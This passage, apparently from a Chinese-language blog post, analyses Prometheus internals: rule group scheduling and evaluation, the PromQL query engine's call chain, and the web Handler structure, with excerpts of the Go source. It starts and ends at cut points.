restored.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Manager)</span> <span class="title">Update</span><span class="params">(interval time.Duration, files []<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">m.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> m.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="comment">// To be replaced with a configurable per-group interval.</span></span><br><span class="line">groups, errs := m.loadGroups(interval, files...)</span><br><span class="line"><span class="keyword">if</span> errs != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, e := <span class="keyword">range</span> errs &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"loading groups failed"</span>, <span class="string">"err"</span>, e)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">"error loading rules, previous rule set restored"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, newg := <span class="keyword">range</span> groups &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// If there is an old group with the same identifier, stop it and wait for</span></span><br><span class="line"><span class="comment">// it to finish the current iteration. Then copy it into the new group.</span></span><br><span class="line">gn := groupKey(newg.name, newg.file)</span><br><span class="line">oldg, ok := m.groups[gn]</span><br><span class="line"><span class="built_in">delete</span>(m.groups, gn)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(newg *Group)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line">oldg.stop()</span><br><span class="line">newg.copyState(oldg)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// Wait with starting evaluation until the rule manager</span></span><br><span class="line"><span class="comment">// is told to run. This is necessary to avoid running</span></span><br><span class="line"><span class="comment">// queries against a bootstrapping storage.</span></span><br><span class="line">&lt;-m.block</span><br><span class="line">newg.run(m.opts.Context)</span><br><span class="line">&#125;()</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;(newg)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stop remaining old groups.</span></span><br><span class="line"><span class="keyword">for</span> _, oldg := <span class="keyword">range</span> m.groups &#123;</span><br><span class="line">oldg.stop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wg.Wait()</span><br><span class="line">m.groups = groups</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 规则组状态复制Group.copyState指从源规则组中，将与目标规则组相同规则名称下的指标赋值给对应的目标规则，将源规则组处于活跃状态下的指标赋值到目标规则组的活跃区域。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copyState copies the alerting rule and staleness related state from the given group.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Rules are matched based on their name. If there are duplicates, the</span></span><br><span class="line"><span class="comment">// first is matched with the first, second with the second etc.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Group)</span> <span class="title">copyState</span><span class="params">(from *Group)</span></span> &#123;</span><br><span class="line">g.evaluationTime = from.evaluationTime</span><br><span class="line"></span><br><span class="line">ruleMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>][]<span class="keyword">int</span>, <span class="built_in">len</span>(from.rules))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fi, fromRule := <span class="keyword">range</span> from.rules &#123;</span><br><span class="line">l, _ := ruleMap[fromRule.Name()]</span><br><span class="line">ruleMap[fromRule.Name()] = <span class="built_in">append</span>(l, fi)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, rule := <span class="keyword">range</span> g.rules &#123;</span><br><span class="line">indexes, _ := ruleMap[rule.Name()]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(indexes) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">fi := indexes[<span class="number">0</span>]</span><br><span class="line">g.seriesInPreviousEval[i] = from.seriesInPreviousEval[fi]</span><br><span class="line">ruleMap[rule.Name()] = indexes[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">ar, ok := rule.(*AlertingRule)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">far, ok := from.rules[fi].(*AlertingRule)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fp, a := <span class="keyword">range</span> far.active &#123;</span><br><span class="line">ar.active[fp] = a</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>规则组启动流程：进入 run  方法后先进行初始化等待，以使得规则运算的时间间隔interval对齐。定义规则运算调度方法iter, 调度收起interval指定；iter方法中调用eval方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Group)</span> <span class="title">run</span><span class="params">(ctx context.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(g.terminated)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait an initial amount to have consistently slotted intervals.</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(g.offset()):</span><br><span class="line"><span class="keyword">case</span> &lt;-g.done:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">iter := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">iterationsScheduled.Inc()</span><br><span class="line"></span><br><span class="line">start := time.Now()</span><br><span class="line">g.Eval(ctx, start)</span><br><span class="line"></span><br><span class="line">iterationDuration.Observe(time.Since(start).Seconds())</span><br><span class="line">g.SetEvaluationTime(time.Since(start))</span><br><span class="line">&#125;</span><br><span class="line">lastTriggered := time.Now()</span><br><span class="line">iter()</span><br><span class="line"></span><br><span class="line">tick := time.NewTicker(g.interval)</span><br><span class="line"><span class="keyword">defer</span> tick.Stop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-g.done:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-g.done:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> &lt;-tick.C:</span><br><span class="line">missed := (time.Since(lastTriggered).Nanoseconds() / g.interval.Nanoseconds()) - <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> missed &gt; <span class="number">0</span> &#123;</span><br><span class="line">iterationsMissed.Add(<span class="keyword">float64</span>(missed))</span><br><span class="line">iterationsScheduled.Add(<span class="keyword">float64</span>(missed))</span><br><span class="line">&#125;</span><br><span class="line">lastTriggered = time.Now()</span><br><span class="line">iter()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>规则组的调度在Eval中实现，Eval方法会将规则组中的每个规则一次放到queryEngine中执行，如果呗执行的规则是AlertingRule类型，执行后结果指标会通过notifier组件发送给告警服务，最后将结果指标存储到prometheus的存储管理器，并对过期指标进行存储标记处理。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Eval runs a single evaluation cycle in which all rules are evaluated sequentially.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Group)</span> <span class="title">Eval</span><span class="params">(ctx context.Context, ts time.Time)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i, rule := <span class="keyword">range</span> g.rules &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-g.done:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>, rule Rule)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">(t time.Time)</span></span> &#123;</span><br><span class="line">evalDuration.Observe(time.Since(t).Seconds())</span><br><span class="line">rule.SetEvaluationTime(time.Since(t))</span><br><span class="line">&#125;(time.Now())</span><br><span class="line"></span><br><span class="line">evalTotal.Inc()</span><br><span class="line"></span><br><span class="line">vector, err := rule.Eval(ctx, ts, g.opts.QueryFunc, g.opts.ExternalURL)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Canceled queries are intentional termination of queries. This normally</span></span><br><span class="line"><span class="comment">// happens on shutdown and thus we skip logging of any errors here.</span></span><br><span class="line"><span class="keyword">if</span> _, ok := err.(promql.ErrQueryCanceled); !ok &#123;</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Evaluating rule failed"</span>, <span class="string">"rule"</span>, rule, <span class="string">"err"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">evalFailures.Inc()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ar, ok := rule.(*AlertingRule); ok &#123;</span><br><span class="line">g.opts.NotifyFunc(ctx, ar.vector.String(), ar.currentAlerts()...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">numOutOfOrder = <span class="number">0</span></span><br><span class="line">numDuplicates = <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app, err := g.opts.Appendable.Appender()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"creating appender failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">seriesReturned := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]labels.Labels, <span class="built_in">len</span>(g.seriesInPreviousEval[i]))</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> vector &#123;</span><br><span class="line"><span class="keyword">if</span> _, err := app.Add(s.Metric, s.T, s.V); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">switch</span> err &#123;</span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfOrderSample:</span><br><span class="line">numOutOfOrder++</span><br><span class="line">level.Debug(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Rule evaluation result discarded"</span>, <span class="string">"err"</span>, err, <span class="string">"sample"</span>, s)</span><br><span class="line"><span class="keyword">case</span> storage.ErrDuplicateSampleForTimestamp:</span><br><span class="line">numDuplicates++</span><br><span class="line">level.Debug(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Rule evaluation result discarded"</span>, <span class="string">"err"</span>, err, <span class="string">"sample"</span>, s)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Rule evaluation result discarded"</span>, <span class="string">"err"</span>, err, <span class="string">"sample"</span>, s)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">seriesReturned[s.Metric.String()] = s.Metric</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> numOutOfOrder &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Error on ingesting out-of-order result from rule evaluation"</span>, <span class="string">"numDropped"</span>, numOutOfOrder)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> numDuplicates &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"Error on ingesting results from rule evaluation with different value but same timestamp"</span>, <span class="string">"numDropped"</span>, numDuplicates)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> metric, lset := <span class="keyword">range</span> g.seriesInPreviousEval[i] &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := seriesReturned[metric]; !ok &#123;</span><br><span class="line"><span class="comment">// Series no longer exposed, mark it stale.</span></span><br><span class="line">_, err = app.Add(lset, timestamp.FromTime(ts), math.Float64frombits(value.StaleNaN))</span><br><span class="line"><span class="keyword">switch</span> err &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="literal">nil</span>:</span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfOrderSample, storage.ErrDuplicateSampleForTimestamp:</span><br><span class="line"><span class="comment">// Do not count these in logging, as this is expected if series</span></span><br><span class="line"><span class="comment">// is exposed from a different rule.</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"adding stale sample failed"</span>, <span class="string">"sample"</span>, metric, <span class="string">"err"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := app.Commit(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Warn(g.logger).Log(<span class="string">"msg"</span>, <span class="string">"rule sample appending failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">g.seriesInPreviousEval[i] = seriesReturned</span><br><span class="line">&#125;</span><br><span class="line">&#125;(i, rule)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>规则调度的流程：</p><p><img src="/images/1572412222861.png" alt="1572412222861"></p><h2 id="QueryEngine"><a href="#QueryEngine" class="headerlink" title="QueryEngine"></a>QueryEngine</h2><p>queryengine是核心模块，规则分为告警规则和记录规则，告警规则会产生告警信息，通过通知组件发送给告警服务，告警规则的计算表达式可以引用记录规则。</p><p>Rule接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A Rule encapsulates a vector expression which is evaluated at a specified</span></span><br><span class="line"><span class="comment">// interval and acted upon (currently either recorded or used for alerting).</span></span><br><span class="line"><span class="keyword">type</span> Rule <span class="keyword">interface</span> &#123;</span><br><span class="line">Name() <span class="keyword">string</span></span><br><span class="line"><span class="comment">// eval evaluates the rule, including any associated recording or alerting actions.</span></span><br><span class="line">Eval(context.Context, time.Time, QueryFunc, *url.URL) (promql.Vector, error)</span><br><span class="line"><span class="comment">// String returns a human-readable string representation of the rule.</span></span><br><span class="line">String() <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">SetEvaluationTime(time.Duration)</span><br><span class="line">GetEvaluationTime() time.Duration</span><br><span class="line"><span class="comment">// HTMLSnippet returns a human-readable string representation of the rule,</span></span><br><span class="line"><span class="comment">// decorated with HTML elements for use the web frontend.</span></span><br><span class="line">HTMLSnippet(pathPrefix <span class="keyword">string</span>) html_template.HTML</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两种规则都是通过实现Rule接口中的Eval方法来完成。</p><p>1）告警状态为StatePending时候，告警持续时间必须大于等于告警规则所配置的持续时间。</p><p>2）告警状态为StateFiring</p><p>告警规则和记录规则Eval方法的实现代码路径为rules/alerting和reording.go</p><p>查询引擎通过EngineQueryFunc方法完成了在RuleManager中的注册。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// QueryFunc processes PromQL queries.</span></span><br><span class="line"><span class="keyword">type</span> QueryFunc <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, q <span class="keyword">string</span>, t time.Time)</span> <span class="params">(promql.Vector, error)</span></span></span><br></pre></td></tr></table></figure><p>规则在查询引擎中运算之前，需要调用Engine.NewInstantQuery方法初始化，完成对规则的解析和对查询器的构建。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewInstantQuery returns an evaluation query for the given expression at the given time.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ng *Engine)</span> <span class="title">NewInstantQuery</span><span class="params">(qs <span class="keyword">string</span>, ts time.Time)</span> <span class="params">(Query, error)</span></span> &#123;</span><br><span class="line">expr, err := ParseExpr(qs)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">qry := ng.newQuery(expr, ts, ts, <span class="number">0</span>)</span><br><span class="line">qry.q = qs</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> qry, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>规则允许的调用链为:</p><p>query.Exec-&gt;Engine.exec-&gt;Engine.execEvalStmt-&gt;evaluator.eval。最为关键的部分在evaluator.eval方法中实现。</p><p>支持的表达式类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AggregateExpr</span><br><span class="line">BinaryExpr</span><br><span class="line">Call</span><br><span class="line">MatrixSelector</span><br><span class="line">NumberLiteral</span><br><span class="line">ParenExpr</span><br><span class="line">StringLiteral</span><br><span class="line">UnaryExpr</span><br><span class="line">VectorSelector</span><br></pre></td></tr></table></figure><p>enginequery模块主要代码在promql目录下；</p><p>ast.go定义查询引擎中常用的结构</p><p>engine.go具体实现</p><p>functions.go实现查询引擎的内置方法</p><p>fuzz.go，parse.go实现两种各不同的表达式解析器</p><p>printer.go, quantile.go, value.go 查询引擎的公共基础方法</p><p>BinaryExpr运算：</p><p><img src="/images/1572413062094.png" alt="1572413062094"></p><p>时间窗口规则运算：</p><p><img src="/images/1572413083570.png" alt="1572413083570"></p><p>规则计算和指标查询：</p><p>查询引擎在规则运算过程中，先对规则进行解析，然后解析后的规则转换成为对应类型的表达式，最后根据转换后的表达式和数据完成规则计算。</p><p>查询引擎是通过调用读写代理器fanoutStorage中的Querier方法获取指标数据的。 Querier方法的主要参数为指标名称，开始时间和结束时间。</p><p>加入指标查询后的规则运算调用链为： query.Exec=&gt;Engine.Exec=&gt;Engine.execEvalStat=&gt;Engine.populateIterators=&gt;Engine.queryable.Querier=&gt;evaluator.eval</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>web组件引用了localStorage组件，fanoutStorage组件，scrapeManager组件，ruleManager组件和notifier组件，对外提供http服务。</p><p>prometheus server服务的handler的数据结构如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Handler serves various HTTP endpoints of the Prometheus server</span></span><br><span class="line"><span class="keyword">type</span> Handler <span class="keyword">struct</span> &#123;</span><br><span class="line">logger log.Logger</span><br><span class="line"></span><br><span class="line">scrapeManager *retrieval.ScrapeManager</span><br><span class="line">ruleManager   *rules.Manager</span><br><span class="line">queryEngine   *promql.Engine</span><br><span class="line">context       context.Context</span><br><span class="line">tsdb          <span class="function"><span class="keyword">func</span><span class="params">()</span> *<span class="title">tsdb</span>.<span class="title">DB</span></span></span><br><span class="line">storage       storage.Storage</span><br><span class="line">notifier      *notifier.Notifier</span><br><span class="line"></span><br><span class="line">apiV1 *api_v1.API</span><br><span class="line"></span><br><span class="line">router       *route.Router</span><br><span class="line">quitCh       <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">reloadCh     <span class="keyword">chan</span> <span class="keyword">chan</span> error</span><br><span class="line">options      *Options</span><br><span class="line">config       *config.Config</span><br><span class="line">configString <span class="keyword">string</span></span><br><span class="line">versionInfo  *PrometheusVersion</span><br><span class="line">birth        time.Time</span><br><span class="line">cwd          <span class="keyword">string</span></span><br><span class="line">flagsMap     <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">externalLabels model.LabelSet</span><br><span class="line">mtx            sync.RWMutex</span><br><span class="line">now            <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">model</span>.<span class="title">Time</span></span></span><br><span class="line"></span><br><span class="line">ready <span class="keyword">uint32</span> <span class="comment">// ready is uint32 rather than boolean to be able to use atomic functions.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web初始化再main中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webHandler := web.New(log.With(logger, <span class="string">"component"</span>, <span class="string">"web"</span>), &amp;cfg.web)</span><br></pre></td></tr></table></figure><p>注册api接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(logger log.Logger, o *Options)</span> *<span class="title">Handler</span></span> &#123;</span><br><span class="line">router := route.New()</span><br><span class="line">cwd, err := os.Getwd()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 